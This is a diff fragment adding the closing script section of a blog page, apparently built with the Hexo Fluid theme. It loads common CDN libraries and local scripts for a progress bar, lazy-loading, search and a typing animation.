+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
